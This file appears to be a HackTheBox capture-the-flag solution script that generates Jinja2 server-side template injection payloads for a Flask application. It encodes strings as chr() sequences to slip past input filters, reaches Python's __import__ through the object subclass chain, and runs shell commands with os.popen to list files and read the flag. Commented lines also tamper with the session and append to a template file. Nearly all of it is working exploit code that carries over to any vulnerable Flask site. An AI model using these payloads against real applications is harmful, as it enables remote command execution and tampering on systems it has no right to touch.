# This was written for the HackTheBox 

from flask import Flask

def get_chr(s): 
    res = [] 
    for i in s: 
        res.append('chr({})'.format(ord(i))) 
    return "%2b".join(res)

# print(f'{{ % set flask=().__class__.__base__.__subclasses__()[59].__init__.__globals__[{get_chr("__builtins__")}][{get_chr("__import__")}]({get_chr("flask")} ) %}}' )
# Returns:
# { % set flask=().__class__.__base__.__subclasses__()[59].__init__.__globals__[chr(95)%2bchr(95)%2bchr(98)%2bchr(117)%2bchr(105)%2bchr(108)%2bchr(116)%2bchr(105)%2bchr(110)%2bchr(115)%2bchr(95)%2bchr(95)][chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)](chr(102)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(107) ) %}

# After getting the flask object, you can modify it through the setdefault method of the session
print(f'{{% set a=flask.session.setdefault({get_chr("leader")}, {get_chr("tttt")}) %}}')
# returns: 
# {% set a=flask.session.setdefault(chr(108)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(101)%2bchr(114), get_chr("tttt")) %}
# {% set a=flask.session.setdefault(chr(108)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(101)%2bchr(114), chr(116)%2bchr(116)%2bchr(116)%2bchr(116)) %}

# print(f'{{% set a=flask.abort(flask.Response({get_chr("test")})) %}}')
# Returns: {% set a=flask.abort(flask.Response(chr(116)%2bchr(101)%2bchr(115)%2bchr(116))) %}


# print(f'{{% set os=().__class__.__base__.__subclasses__()[59].__init__.__globals__[{get_chr("__builtins__")}][{get_chr("__import__")}]({get_chr("os")}) %}}')
# Returns: {% set os=().__class__.__base__.__subclasses__()[59].__init__.__globals__[chr(95)%2bchr(95)%2bchr(98)%2bchr(117)%2bchr(105)%2bchr(108)%2bchr(116)%2bchr(105)%2bchr(110)%2bchr(115)%2bchr(95)%2bchr(95)][chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)](chr(111)%2bchr(115)) %}

# print(f'{{% set a=flask.abort(flask.Response(os.popen({get_chr("ls")}).read())) %}}')
# Returns: {% set a=flask.abort(flask.Response(os.popen(chr(108)%2bchr(115)).read())) %}





def get_payload(): 
# payload = f'{\{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}}{\{% if ().__class__ .__base__.__subclasses__()[59].__init__.__globals__[{get_chr("__builtins__")}][{get_chr("__import__")}]({get_chr("os")}).open({get_chr(" templates/index.html")}, {get_chr("a+")}).write({get_chr("tttttt")}) %}}11{\{% endif %}}' 
    define_chr = f"{{ % set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}}"
    define_flask = f'{{% set flask=().__class__.__base__.__subclasses__()[59].__init__.__globals__[{get_chr("__builtins__")}][{get_chr("__import__")}]({ get_chr("flask")}) %}}' 
    define_os = f'{{% set os=().__class__.__base__.__subclasses__()[59].__init__.__globals__[{get_chr("__builtins__")}] [{get_chr("__import__")}]({get_chr("os")}) %}}' 
    payload = f'{{% set a=flask.abort(flask.Response(os.popen({get_chr( "cat flag_P54ed")}).read())) %}}' 
    payload = define_chr + define_flask + define_os + payload 
    return print(payload)

get_payload()